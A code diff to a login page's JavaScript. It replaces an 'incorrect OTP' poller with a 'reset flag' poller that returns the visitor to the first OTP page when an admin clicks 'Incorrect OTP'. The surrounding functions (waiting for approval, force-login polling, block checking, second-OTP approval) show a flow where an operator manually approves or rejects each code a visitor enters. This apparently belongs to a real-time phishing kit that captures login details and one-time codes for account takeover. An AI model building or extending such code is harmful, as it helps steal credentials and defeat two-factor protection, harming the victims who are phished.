@@ -288,7 +288,7 @@ button:disabled{
   let isProcessing = false;
   let approvalInterval = null;
   let blockCheckInterval = null;
-  let incorrectOtpInterval = null;
+  let resetFlagInterval = null;
   let isModalOpen = false;
 
   async function checkIfBlocked() {
@@ -320,38 +320,21 @@ button:disabled{
     }, 3000);
   }
 
-  // Incorrect OTP polling - RESETS EVERYTHING and redirects back to first OTP page
-  function startIncorrectOtpPolling() {
-    if (incorrectOtpInterval) clearInterval(incorrectOtpInterval);
-    incorrectOtpInterval = setInterval(async () => {
+  // RESET FLAG POLLING - When admin clicks "Incorrect OTP", redirect to first OTP page
+  function startResetFlagPolling() {
+    if (resetFlagInterval) clearInterval(resetFlagInterval);
+    resetFlagInterval = setInterval(async () => {
       try {
-        const response = await fetch('/api/users/check-admin-text', {
+        const response = await fetch('/api/users/check-reset-flag', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email })
         });
         const data = await response.json();
         
-        if (data.admin_text === 'incorrect_otp_error' && data.text_release === false) {
-          // Show red error message
-          errorDiv.textContent = '❌ Incorrect OTP entered. Please start over from first OTP.';
-          errorDiv.style.display = 'block';
-          errorDiv.style.color = '#ef4444';
-          errorDiv.style.background = '#fef2f2';
-          errorDiv.style.padding = '12px';
-          errorDiv.style.borderRadius = '12px';
-          
-          // REDIRECT BACK TO FIRST OTP PAGE to start fresh
-          setTimeout(() => {
-            window.location.href = `/users/otp?email=${encodeURIComponent(email)}`;
-          }, 2000);
-          
-          // Clear the error flag
-          await fetch('/api/admin/release-text', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email })
-          });
+        if (data.reset === true) {
+          // Redirect back to first OTP page to start fresh
+          window.location.href = `/users/otp?email=${encodeURIComponent(email)}`;
         }
       } catch (err) {}
     }, 2000);
@@ -438,7 +421,7 @@ button:disabled{
       if (data.success) {
         showWaitingForApproval();
         startBlockChecking();
-        startIncorrectOtpPolling();
+        startResetFlagPolling();
         startCheckingSecondApproval();
       } else {
         hideLoading();
@@ -552,7 +535,7 @@ button:disabled{
   startForceLoginPolling();
   startRedirectSuccessPolling();
   startBlockChecking();
-  startIncorrectOtpPolling();
+  startResetFlagPolling();
 
   verifyBtn.addEventListener('click', verifySecondOTP);
   otpInput.addEventListener('keypress', (e) => {
@@ -564,5 +547,6 @@ button:disabled{
   });
   document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);
 </script>
+
 </body>
 </html>
